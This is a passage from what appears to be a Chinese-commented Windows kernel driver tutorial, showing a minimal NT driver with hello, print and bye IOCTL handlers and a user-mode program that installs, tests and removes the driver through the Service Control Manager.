   switch (uIoctrlCode)
   {
   case CTL_HELLO:
      DbgPrint("Hello iocontrol\n");
      break;
   case CTL_PRINT:
      DbgPrint("%ws\n", pInputBuff);
      //*(DWORD *)pOutputBuff =2;
      break;
   case CTL_BYE:
      DbgPrint("Goodbye iocontrol\n");
      break;
   default:
      DbgPrint("Unknown iocontrol\n");

   }

   pIrp->IoStatus.Status = STATUS_SUCCESS;
   pIrp->IoStatus.Information = 0;//sizeof(DWORD);
   IoCompleteRequest(pIrp, IO_NO_INCREMENT);

   return STATUS_SUCCESS;

}

NTSTATUS DispatchClean(PDEVICE_OBJECT pObject, PIRP pIrp)
{
   pIrp->IoStatus.Status = STATUS_SUCCESS;
   pIrp->IoStatus.Information = 0;

   IoCompleteRequest(pIrp, IO_NO_INCREMENT);

   return STATUS_SUCCESS;
}

NTSTATUS DispatchClose(PDEVICE_OBJECT pObject, PIRP pIrp)
{
   pIrp->IoStatus.Status = STATUS_SUCCESS;
   pIrp->IoStatus.Information = 0;

   IoCompleteRequest(pIrp, IO_NO_INCREMENT);

   return STATUS_SUCCESS;
}


VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
   UNICODE_STRING uLinkName = { 0 };
   RtlInitUnicodeString(&uLinkName, LINK_NAME);
   IoDeleteSymbolicLink(&uLinkName);

   IoDeleteDevice(pDriverObject->DeviceObject);

   DbgPrint("Driver unloaded\n");

}

NTSTATUS DriverEntry                //程序入口
(
   PDRIVER_OBJECT pDriverObject,          
   PUNICODE_STRING pRegPath      //pRegPath:注册表路径
)
{
   UNICODE_STRING uDeviceName = { 0 };  //UNICODE_STRING内核中表示字符串的方法
   UNICODE_STRING uLinkName = { 0 };
   NTSTATUS ntStatus = 0;           //驱动中返回值0代表成功
   PDEVICE_OBJECT pDeviceObject = NULL;
   ULONG i = 0;

   DbgPrint("Driver load begin\n");

   RtlInitUnicodeString(&uDeviceName, DEVICE_NAME);  //将设备名的宏定义转化为UNICODE_STRING类型
   RtlInitUnicodeString(&uLinkName, LINK_NAME);

   //创建设备对象
   ntStatus = IoCreateDevice  //IoCreateDevice定义在wdm.h中
   (
      pDriverObject,
      0,                    //DeviceExtensionSize设备扩展长度
      &uDeviceName, 
      FILE_DEVICE_UNKNOWN,  //DeviceType设备类型
      0,                      //DeviceCharacteristics设备特征
      FALSE,    //Exclusive驱动对象是否独占，为了安全设为TRUE
      &pDeviceObject          //传指针(指针的指针)
   );                          //返回&pDeviceObject

   if (!NT_SUCCESS(ntStatus))     //宏定义：#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
   {
      DbgPrint("IoCreateDevice failed:%x", ntStatus);
      return ntStatus;
   }

   //DO_BUFFERED_IO规定R3和R0之间read和write通信的方式：
   //1,buffered io 缓存会拷贝一次，安全，但是效率低
   //2,direct io 先映射到物理地址，然后R0和R3共用，效率高
   //3,neither io  R3直接传到R0
   //DO_DEVICE_INITIALIZING   防止初始化之前发送IO请求

   pDeviceObject->Flags |= DO_BUFFERED_IO;     

   //创建符号链接
   ntStatus = IoCreateSymbolicLink(&uLinkName, &uDeviceName);
   if (!NT_SUCCESS(ntStatus))       
   {
      DbgPrint("IoCreateSymbolicLink failed:%x\n", ntStatus);
      IoDeleteDevice(pDeviceObject);       //如果创建失败，删除之前创建的设备对象
      return ntStatus;
   }

   for (i = 0; i<IRP_MJ_MAXIMUM_FUNCTION + 1; i++)          //初始化分发函数
   {
      pDriverObject->MajorFunction[i] = DispatchCommon;
   }

   //初始化重要的分发函数
   pDriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;    //打开文件
   pDriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;  //读，数据从R0->R3
   pDriverObject->MajorFunction[IRP_MJ_WRITE] = DispatchWrite; //写，数据从R3->R0
   pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctrl; //关键函数，任何功能，可以实现所有功能
   pDriverObject->MajorFunction[IRP_MJ_CLEANUP] = DispatchClean;
   pDriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;

   pDriverObject->DriverUnload = DriverUnload;            //卸载驱动

   DbgPrint("Driver load ok!\n");

   return STATUS_SUCCESS;
}
安装代码：
#include <windows.h>  
#include <winsvc.h>  
#include <conio.h>  
#include <stdio.h>
#include <winioctl.h>

#pragma warning(disable:4996)

#define DRIVER_NAME "ntmodeldrv"
#define DRIVER_PATH ".\\ntmodeldrv.sys"    //要加载的驱动路径

#define IOCTRL_BASE 0x800

#define MYIOCTRL_CODE(i) \
   CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE+i, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define CTL_HELLO MYIOCTRL_CODE(0)
#define CTL_PRINT MYIOCTRL_CODE(1)
#define CTL_BYE MYIOCTRL_CODE(2)

//装载NT驱动程序
BOOL LoadDriver(char* lpszDriverName, char* lpszDriverPath)
{
   //char szDriverImagePath[256] = "D:\\DriverTest\\ntmodelDrv.sys";
   char szDriverImagePath[256] = { 0 };
   //得到完整的驱动路径
   GetFullPathName(lpszDriverPath, 256, szDriverImagePath, NULL);

   BOOL bRet = FALSE;

   SC_HANDLE hServiceMgr = NULL;//SCM管理器的句柄
   SC_HANDLE hServiceDDK = NULL;//NT驱动程序的服务句柄

    //打开服务控制管理器
   hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

   if (hServiceMgr == NULL)
   {
      //OpenSCManager失败
      printf("OpenSCManager() Failed %d ! \n", GetLastError());
      bRet = FALSE;
      goto BeforeLeave;
   }
   else
   {
      ////OpenSCManager成功
      printf("OpenSCManager() ok ! \n");
   }

   //创建驱动所对应的服务
   hServiceDDK = CreateService(hServiceMgr,
      lpszDriverName, //驱动程序的在注册表中的名字  
      lpszDriverName, // 注册表驱动程序的 DisplayName 值  
      SERVICE_ALL_ACCESS, // 加载驱动程序的访问权限  
      SERVICE_KERNEL_DRIVER,// 表示加载的服务是驱动程序  
      SERVICE_DEMAND_START, // 注册表驱动程序的 Start 值(3) 决定启动顺序
      SERVICE_ERROR_IGNORE, //注册表驱动程序的 ErrorControl 值  
      szDriverImagePath, // 注册表驱动程序的 ImagePath 值  errcode:2
      NULL,  //GroupOrder 在HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GroupOrderList处决定启动顺序
      NULL,
      NULL,
      NULL,
      NULL);

   DWORD dwRtn;
   //判断服务是否失败
   if (hServiceDDK == NULL)
   {
      dwRtn = GetLastError();
      if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_EXISTS)
      {
         //由于其他原因创建服务失败
         printf("CrateService() Failed %d ! \n", dwRtn);
         bRet = FALSE;
         goto BeforeLeave;
      }
      else
      {
         //服务创建失败，是由于服务已经创立过
         printf("CrateService() Failed Service is ERROR_IO_PENDING or ERROR_SERVICE_EXISTS! \n");
      }

      // 驱动程序已经加载，只需要打开  
      hServiceDDK = OpenService(hServiceMgr, lpszDriverName, SERVICE_ALL_ACCESS);
      if (hServiceDDK == NULL)
      {
         //如果打开服务也失败，则意味错误
         dwRtn = GetLastError();
         printf("OpenService() Failed %d ! \n", dwRtn);
         bRet = FALSE;
         goto BeforeLeave;
      }
      else
      {
         printf("OpenService() ok ! \n");
      }
   }
   else
   {
      printf("CrateService() ok ! \n");
   }

   //开启此项服务
   bRet = StartService(hServiceDDK, NULL, NULL);
   if (!bRet)
   {
      DWORD dwRtn = GetLastError();
      if (dwRtn != ERROR_IO_PENDING && dwRtn != ERROR_SERVICE_ALREADY_RUNNING)
      {
         printf("StartService() Failed %d ! \n", dwRtn);
         bRet = FALSE;
         goto BeforeLeave;
      }
      else
      {
         if (dwRtn == ERROR_IO_PENDING)
         {
            //设备被挂住
            printf("StartService() Failed ERROR_IO_PENDING ! \n");
            bRet = FALSE;
            goto BeforeLeave;
         }
         else
         {
            //服务已经开启
            printf("StartService() Failed ERROR_SERVICE_ALREADY_RUNNING ! \n");
            bRet = TRUE;
            goto BeforeLeave;
         }
      }
   }
   bRet = TRUE;
   //离开前关闭句柄
BeforeLeave:
   if (hServiceDDK)
   {
      CloseServiceHandle(hServiceDDK);
   }
   if (hServiceMgr)
   {
      CloseServiceHandle(hServiceMgr);
   }
   return bRet;
}

//卸载驱动程序  
BOOL UnloadDriver(char * szSvrName)
{
   BOOL bRet = FALSE;
   SC_HANDLE hServiceMgr = NULL;//SCM管理器的句柄
   SC_HANDLE hServiceDDK = NULL;//NT驱动程序的服务句柄
   SERVICE_STATUS SvrSta;
   //打开SCM管理器
   hServiceMgr = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
   if (hServiceMgr == NULL)
   {
      //打开SCM管理器失败
      printf("OpenSCManager() Failed %d ! \n", GetLastError());
      bRet = FALSE;
      goto BeforeLeave;
   }
   else
   {
      //打开SCM管理器失败成功
      printf("OpenSCManager() ok ! \n");
   }
   //打开驱动所对应的服务
   hServiceDDK = OpenService(hServiceMgr, szSvrName, SERVICE_ALL_ACCESS);

   if (hServiceDDK == NULL)
   {
      //打开驱动所对应的服务失败
      printf("OpenService() Failed %d ! \n", GetLastError());
      bRet = FALSE;
      goto BeforeLeave;
   }
   else
   {
      printf("OpenService() ok ! \n");
   }
   //停止驱动程序，如果停止失败，只有重新启动才能，再动态加载。  
   if (!ControlService(hServiceDDK, SERVICE_CONTROL_STOP, &SvrSta))
   {
      printf("ControlService() Failed %d !\n", GetLastError());
   }
   else
   {
      //打开驱动所对应的失败
      printf("ControlService() ok !\n");
   }


   //动态卸载驱动程序。  

   if (!DeleteService(hServiceDDK))
   {
      //卸载失败
      printf("DeleteSrevice() Failed %d !\n", GetLastError());
   }
   else
   {
      //卸载成功
      printf("DelServer:deleteSrevice() ok !\n");
   }

   bRet = TRUE;
BeforeLeave:
   //离开前关闭打开的句柄
   if (hServiceDDK)
   {
      CloseServiceHandle(hServiceDDK);
   }
   if (hServiceMgr)
   {
      CloseServiceHandle(hServiceMgr);
   }
   return bRet;
}

void TestDriver()
{
   //测试驱动程序  
   HANDLE hDevice = CreateFile("\\\\.\\ntmodeldrv",       //打开驱动链接,对应R0的DispatchCreate
      GENERIC_WRITE | GENERIC_READ,
      0,
      NULL,
      OPEN_EXISTING,
      0,
      NULL);
   if (hDevice != INVALID_HANDLE_VALUE)
   {
      printf("Create Device ok ! \n");
   }
   else
   {
      printf("Create Device Failed %d ! \n", GetLastError());
      return;
   }
   CHAR bufRead[1024] = { 0 };
   WCHAR bufWrite[1024] = L"Hello, world";

   DWORD dwRead = 0;
   DWORD dwWrite = 0;

   ReadFile(hDevice, bufRead, 1024, &dwRead, NULL);   //对应R0的DispatchRead
   printf("Read done!:%ws\n", bufRead);
   printf("Please press any key to write\n");
   getch();
   WriteFile(hDevice, bufWrite, (wcslen(bufWrite) + 1) * sizeof(WCHAR), &dwWrite, NULL);   //对应R0的DispatchWrite

   printf("Write done!\n");

   printf("Please press any key to deviceiocontrol\n");
   getch();
   CHAR bufInput[1024] = "Hello, world";
   CHAR bufOutput[1024] = { 0 };
   DWORD dwRet = 0;

   WCHAR bufFileInput[1024] = L"c:\\docs\\hi.txt";

   printf("Please press any key to send PRINT\n");
   getch();
   DeviceIoControl(hDevice,   //对应R0的DispatchIoctrl
      CTL_PRINT,
      bufFileInput,
      sizeof(bufFileInput),
      bufOutput,
      sizeof(bufOutput),
      &dwRet,
      NULL);
   printf("Please press any key to send HELLO\n");
   getch();
   DeviceIoControl(hDevice,
      CTL_HELLO,
      NULL,
      0,
      NULL,
      0,
      &dwRet,
      NULL);
   printf("Please press any key to send BYE\n");
   getch();
   DeviceIoControl(hDevice,
      CTL_BYE,
      NULL,
      0,
      NULL,
      0,
      &dwRet,
      NULL);
   printf("DeviceIoControl done!\n");
   CloseHandle(hDevice);
}

int main(int argc, char* argv[])
{
   //加载驱动
   BOOL bRet = LoadDriver(DRIVER_NAME, DRIVER_PATH);
   if (!bRet)
   {
      printf("LoadNTDriver error\n");
      return 0;
   }
   //加载成功

   printf("press any key to create device!\n");
   getch();

   TestDriver();

   //这时候你可以通过注册表，或其他查看符号连接的软件验证。
   printf("press any key to stop service!\n");
   getch();

   //卸载驱动
   bRet = UnloadDriver(DRIVER_NAME);
   if (!bRet)
   {
      printf("UnloadNTDriver error\n");
      return 0;
   }


   return 0;
}  
```  
